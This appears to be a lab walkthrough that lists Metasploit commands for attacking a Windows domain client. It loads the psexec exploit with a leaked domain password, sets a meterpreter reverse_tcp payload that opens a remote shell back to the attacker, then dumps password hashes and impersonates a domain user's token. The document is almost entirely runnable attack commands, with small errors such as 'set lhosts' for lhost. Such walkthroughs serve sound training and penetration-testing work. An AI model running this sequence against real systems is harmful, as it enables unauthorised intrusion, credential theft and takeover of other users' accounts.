

Open Metasploit

```
msfconsole
```

Load a psexec exploit on the Kali Linux machine to use on either of the two client machines

```
use exploit/windows/smb/psexec
```

Show the list of options for psexec we have to input (Information needed for the target computer)

```
options
```

Set the Remote Hosts to be Desktop-1

```
set rhosts 192.168.4.16
```

Set the domain using the domain name

```
set smbdomain mydomain.com
```

Input the leaked password

```
set smbpass Password@1
```

Set the leaked user's username

```
set smbuser ronyango
```

Show available exploit targets on the machine

```
show targets
```

Choose Native upload

```
set target 2
```

Confirm that we have setup the attack via the previous commands properly

```
options
```

Set a playload to use on the attack

```
set payload windows/x64/meterpreter/reverse_tcp
```

```
options
```

The Kali Linux network interface that receives the reverse connection (LHOST = Listening Host)

```
set lhosts eth1
```

```
options
```

Run the setup to get a Meterpreter session

```
run
```

Get the Hash dunp

```
hashdump
```

Get user id

```
getuid
```

Get system information

```
sysinfo
```

Load a tool (Type double tap after the command)

```
load
```

Load the incognito tool

```
load incognito
```

Get help: Focus on the last section which will have the commands of the last tool loaded i.e. incognito

```
help
```

List the tokens for the users of this machine

```
list_tokens -u
```

Impersonate the user. Notice the two backslashes for character escaping

```
impersonate_token mydomain\\ronyango
```

Get shell

```
shell
```

```
whoami
```

Terminate the shell.

**NOTE**: Running a command like hashdump at this point will not work as we are not running as the system of the machine. Revert to the old-self that you loaded the initial shell as using the following the command:

```
rev2self
```

Hashdump should now work

```
hashdump
```

**NOTE**: The attack will get the tokens of the user currently logged in.
